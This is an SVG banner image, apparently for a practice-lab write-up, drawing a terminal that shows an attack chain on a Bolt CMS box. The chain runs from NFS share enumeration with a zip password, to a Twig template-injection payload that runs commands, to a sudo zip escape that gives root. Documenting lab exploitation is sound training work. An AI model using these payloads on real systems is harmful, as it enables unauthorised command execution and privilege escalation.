<svg xmlns="http://www.w3.org/2000/svg" width="800" height="450" viewBox="0 0 800 450">
  <defs>
    <linearGradient id="devBg" x1="0" y1="0" x2="1" y2="1" gradientUnits="objectBoundingBox">
      <stop offset="0%" stop-color="#0a0f1a"/>
      <stop offset="100%" stop-color="#101a2e"/>
    </linearGradient>
    <linearGradient id="badgeFillDev" x1="0" y1="0" x2="0" y2="1" gradientUnits="objectBoundingBox">
      <stop offset="0%" stop-color="#7c3aed"/>
      <stop offset="100%" stop-color="#4c1d95"/>
    </linearGradient>
    <filter id="glowDev" x="-40%" y="-40%" width="180%" height="180%">
      <feGaussianBlur in="SourceGraphic" stdDeviation="4.5" result="blur"/>
      <feMerge><feMergeNode in="blur"/><feMergeNode in="SourceGraphic"/></feMerge>
    </filter>
  </defs>

  <rect width="800" height="450" fill="url(#devBg)"/>

  <g stroke="#2e2a5c" stroke-width="0.6" opacity="0.35">
    <line x1="0" y1="90" x2="800" y2="90"/>
    <line x1="0" y1="180" x2="800" y2="180"/>
    <line x1="0" y1="360" x2="800" y2="360"/>
    <line x1="200" y1="0" x2="200" y2="450"/>
    <line x1="600" y1="0" x2="600" y2="450"/>
  </g>

  <!-- Terminal window -->
  <rect x="40" y="52" width="720" height="300" rx="10" fill="#0d1220" stroke="#3730a3" stroke-width="1.2"/>
  <rect x="40" y="52" width="720" height="30" rx="10" fill="#161b30"/>
  <rect x="40" y="67" width="720" height="15" fill="#161b30"/>
  <circle cx="63" cy="67" r="5.5" fill="#ff5f57"/>
  <circle cx="81" cy="67" r="5.5" fill="#febc2e"/>
  <circle cx="99" cy="67" r="5.5" fill="#28c840"/>
  <text x="400" y="72" text-anchor="middle" fill="#6b6ba8" font-family="monospace" font-size="11">jeanpaul@dev: ~</text>

  <text x="58" y="110" fill="#8b8bc9" font-family="monospace" font-size="12">$ showmount -e 10.0.2.5</text>
  <text x="58" y="130" fill="#a5a5e0" font-family="monospace" font-size="11">/srv/nfs *.0.0.0/8 → save.zip (password: java101)</text>

  <text x="58" y="160" fill="#8b8bc9" font-family="monospace" font-size="12">index.twig</text>
  <text x="58" y="182" fill="#c4b5fd" font-family="monospace" font-size="11.5">{{ ['id']|map('system')|join }}</text>
  <text x="58" y="204" fill="#34d399" font-family="monospace" font-size="11.5">→ uid=33(www-data) gid=33(www-data)</text>

  <text x="58" y="234" fill="#8b8bc9" font-family="monospace" font-size="12">$ sudo -l</text>
  <text x="58" y="254" fill="#fbbf24" font-family="monospace" font-size="11.5">(root) NOPASSWD: /usr/bin/zip</text>

  <text x="58" y="284" fill="#8b8bc9" font-family="monospace" font-size="12">$ sudo zip jeanpaul /etc/hosts -T -TT '/bin/sh #'</text>
  <text x="58" y="306" fill="#34d399" font-family="monospace" font-size="12" font-weight="bold" filter="url(#glowDev)"># whoami → root</text>
  <rect x="58" y="314" width="8" height="13" fill="#a78bfa" opacity="0.85"/>

  <!-- Badges row -->
  <rect x="40" y="378" width="140" height="34" rx="17" fill="url(#badgeFillDev)" opacity="0.9"/>
  <text x="110" y="400" text-anchor="middle" fill="#f5f3ff" font-family="Inter,sans-serif" font-size="13" font-weight="700" letter-spacing="0.5">PEH · DEV</text>

  <rect x="192" y="378" width="120" height="34" rx="17" fill="rgba(167,139,250,0.1)" stroke="#8b5cf6" stroke-width="1"/>
  <text x="252" y="400" text-anchor="middle" fill="#c4b5fd" font-family="Inter,sans-serif" font-size="12" font-weight="600">Twig SSTI</text>

  <rect x="324" y="378" width="130" height="34" rx="17" fill="rgba(167,139,250,0.1)" stroke="#8b5cf6" stroke-width="1"/>
  <text x="389" y="400" text-anchor="middle" fill="#c4b5fd" font-family="Inter,sans-serif" font-size="12" font-weight="600">Bolt CMS</text>

  <rect x="466" y="378" width="140" height="34" rx="17" fill="rgba(167,139,250,0.1)" stroke="#8b5cf6" stroke-width="1"/>
  <text x="536" y="400" text-anchor="middle" fill="#c4b5fd" font-family="Inter,sans-serif" font-size="12" font-weight="600">GTFOBins</text>

  <text x="760" y="400" text-anchor="end" fill="#4c4c8f" font-family="monospace" font-size="10.5">box 3 of 5</text>
</svg>
